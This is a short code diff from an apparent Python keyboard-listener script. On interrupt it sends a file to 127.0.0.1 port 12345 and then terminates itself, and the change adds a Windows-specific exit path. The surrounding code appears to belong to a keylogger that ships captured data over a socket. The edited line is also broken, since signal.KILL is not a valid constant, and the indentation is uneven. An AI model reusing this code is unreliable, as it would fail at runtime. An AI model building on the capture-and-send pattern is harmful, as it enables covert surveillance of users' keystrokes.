@@ -32,6 +32,9 @@ def listen_keyboard():
             listener.join()
     except KeyboardInterrupt:
         client.send_file_securely("127.0.0.1", 12345)
-        os.kill(os.getpid(), signal.SIGKILL)
+        if os.name == "nt":
+                os._exit(1)
+        else:
+            os.kill(os.getpid(), signal.KILL)
 
         
